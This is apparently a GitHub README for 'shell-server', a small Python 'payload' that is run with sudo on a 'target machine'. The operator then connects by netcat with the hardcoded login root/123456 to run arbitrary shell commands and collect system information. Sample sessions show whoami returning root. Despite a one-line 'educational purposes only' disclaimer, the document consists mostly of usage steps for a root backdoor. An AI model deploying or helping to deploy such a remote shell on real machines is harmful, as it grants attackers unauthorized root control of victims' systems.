<p align="center">
  <a href="https://github.com/thiiagoms/shell-server">
    <img src="assets/payload.png" alt="Logo" width="80" height="80">
  </a>
     <h3 align="center">Simple payload with Python! :bucket:</h3>
</p>

Execute commands, get info about system with this little pythonic example. You **MUST** use this example **ONLY** for educational purposes.

- [Dependencies](#dependencies)
- [Use:](#use)


### Dependencies
* Python 3.5+

### Use:

1 - Clone the repository:
```bash
$ git clone https://github.com/thiiagoms/shell-server,
```

2 - Change host and port on `payload.py` and then execute on target machine:
```python
$ sudo python payload.py
```

3 - You can use netcat for example, to connect on host and port:
```bash
$ netcat <host> <port>

[*] Username: root
[*] Password: 123456

$ <you-are-connect-on-machine>
```

4 - You have two commands on payload: `shell, server-info and exit`

* First: `shell` to execute commands on target machine
```bash
Welcome to socket server panel. 
$ shell
shell >>: ls

assets
LICENSE
payload.py
README.md

shell >>: whoami

root     
```
* Second: `server-info` to get info about machine
```bash
$ server info

Linux codex 5.13.19-2-MANJARO #1 SMP PREEMPT Sun Sep 19 21:31:53 UTC 2021 x86_64 GNU/Linux
```
* Third: `exit` to exit payload and close connection:
```bash
$ exit
```